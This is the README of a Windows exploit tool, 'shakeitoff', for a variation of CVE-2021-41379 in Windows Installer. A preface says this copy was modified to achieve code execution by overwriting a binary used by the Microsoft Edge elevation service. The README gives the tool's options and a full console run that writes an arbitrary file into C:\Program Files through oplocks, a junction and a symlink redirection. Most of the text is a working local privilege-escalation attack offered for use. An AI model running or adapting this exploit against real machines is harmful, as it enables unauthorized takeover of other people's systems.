# NOTE:

This version of shakeitoff has been altered and combined with parts of the original InstallerFileTakeOver (linked below in the original README by the author of shakeitoff) in order to acheive code execution after overwriting the target binary by leveraging the MicrosoftEdgeElevationService.  This of course requires that edge is installed on the target machine, and that the service exists.  This has been tested on Win10, Win11, Server 2K16, and Server 2K19.  Additionally a switch was added to allow the user to specify what file they wish to overwrite the target file with (as opposed to the original POC's which overwrote the target file with the POC).

# shakeitoff

A smaller, minimized, and cleaner version of [InstallerFileTakeOver](https://github.com/klinix5/InstallerFileTakeOver) aka the zero-day exploit that is a "variation" of CVE-2021-41379. This version *does not* pop a shell like `InstallerFileTakeOver`. The point of this code was to create a simpler proof of concept that more reliably demonstrates the file creation attack. This proof of concept will create the arbitrary file requested by the user (and copy itself into it to prove writablity). Demonstrating code execution is a trivial excercise left up to the reader.

To understand how the attack works, please see the [AttackerKB write up](https://attackerkb.com/topics/7LstI2clmF/cve-2021-41379/rapid7-analysis).

## Usage

The tool requires three parameters:

```
C:\Users\albinolobster\source\repos\shakeitoff\x64\Release>.\shakeitoff.exe
option "msi_path" is required
Allowed options:
  -h, --help              produce help message
  -m, --msi_path arg      The path to the MSI to install
  -i, --install_path arg  The path to install to
  -p, --target_path arg   The file to create
```

1. -m - the msi to install (full path required). One is provided in this repository (and you should use it since the file paths actually matter).
2. -i - the install path (full path required). This is where the msi is installed / the exploit goes down. The user must specify this beforehand and it *must* be an empty directory. The tool doesn't clean it up because it makes figuring out the bug easier. There also must be a trailing \ because I'm a monster.
3. -p - the file to overwrite/create. Full path required.


The PoC will just copy itself into the target file. 


## Usage Example

```
C:\Users\Public>dir "C:\Program Files\lol"
 Volume in drive C has no label.
 Volume Serial Number is 5E1E-AC13

 Directory of C:\Program Files

File Not Found

C:\Users\Public>.\shakeitoff.exe -m C:\Users\Public\shakeitoff.msi -i C:\Users\Public\lol\ -p "C:\Program Files\lol"
[+] User provided MSI path: C:\Users\Public\shakeitoff.msi
[+] The target path is: C:\Program Files\lol
[+] Create the temp directory structure we'll install into
[+] Grabbing handle to lock C:\Users\Public\lol\shakeitoff\haters.jpg
[+] Grabbing a directory handle of C:\Users\Public\lol\shakeitoff\
[+] Monitor shakeitoff\shakeitoff for an rbf file
[+] MSI install: ACTION=ADMIN REBOOT=ReallySuppress TARGETDIR=C:\Users\Public\lol\ C:\Users\Public\shakeitoff.msi
[+] Grabbing a handle to inner shakeitoff directory
[+] In callback for oplock one
[+] Opening handle to C:\Users\Public\lol\shakeitoff\8da858.rbf
[+] Creating the callback directory at C:\Users\Public\lol\cb_directory
[+] Grab a handle for the callback directry
[+] Creating a junction from C:\Users\Public\lol\cb_directory to \BaseNamedObjects\Restricted
[+] Inside callback two
[+] Release the hater.jpg handle to unlock
[+] Move the rbf file to C:\Users\Public\lol\weird_directory
[+] Move inner shakeitoff to C:\Users\Public\lol\weird_directory
[+] Move junction at C:\Users\Public\lol\cb_directory to C:\Users\Public\lol\shakeitoff
[+] Configuring symlink from \BaseNamedObjects\Restricted\8da858.rbf to \??\C:\Program Files\lol
[+] symlink created!
[+] MsiInstallProductA return value: 1603
[+] Exploit thread joined
[+] Copy into target!

C:\Users\Public>dir "C:\Program Files\lol"
 Volume in drive C has no label.
 Volume Serial Number is 5E1E-AC13

 Directory of C:\Program Files

12/02/2021  02:01 PM           368,640 lol
               1 File(s)        368,640 bytes
               0 Dir(s)  86,015,610,880 bytes free
```

## Credit

* This code is influenced by the original [exploit](https://github.com/klinix5/InstallerFileTakeOver) published by Abdelhamid Naceri (also the original vulnerability discoverer!).
* The `FileOpLock` code is a (slight modified) version pulled out of [angrypolarbearbug2](https://github.com/jackusm/polarbearrepo/tree/f37184a3fc3ffa5ea76035c9fbdee95a39d7b4c3/angrypolarbearbug2)
* Taylor Swift
